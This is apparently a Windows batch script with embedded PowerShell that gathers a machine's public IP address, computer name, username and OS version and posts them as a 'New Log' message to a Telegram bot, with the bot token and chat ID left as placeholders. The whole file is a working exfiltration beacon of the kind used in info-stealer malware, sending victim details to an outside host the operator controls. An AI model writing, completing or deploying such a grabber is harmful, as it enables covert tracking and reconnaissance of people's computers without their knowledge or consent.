@echo off

set BOT_TOKEN=PUT_BOT_TOKEN_HERE
set CHAT_ID=PUT_CHAT_ID_HERE

if "%BOT_TOKEN%"=="PUT_BOT_TOKEN_HERE" (
    echo Error: Telegram credentials not set!
    pause
    exit
)

powershell -Command ^
"$token = '%BOT_TOKEN%';" ^
"$chatid = '%CHAT_ID%';" ^
"$ip = Invoke-RestMethod -Uri 'https://api.ipify.org';" ^
"$pc = $env:COMPUTERNAME;" ^
"$user = $env:USERNAME;" ^
"$os = (Get-WmiObject -class Win32_OperatingSystem).Caption;" ^
"$msg = \"🔍 *New Log*`n`n*IP:* ``$ip ```n*Machine:* ``$pc ```n*User:* ``$user ```n*OS:* $os\";" ^
"$url = \"https://api.telegram.org/bot$token/sendMessage\";" ^
"$payload = @{ chat_id = $chatid; text = $msg; parse_mode = 'Markdown' };" ^
"Invoke-RestMethod -Uri $url -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'"

exit
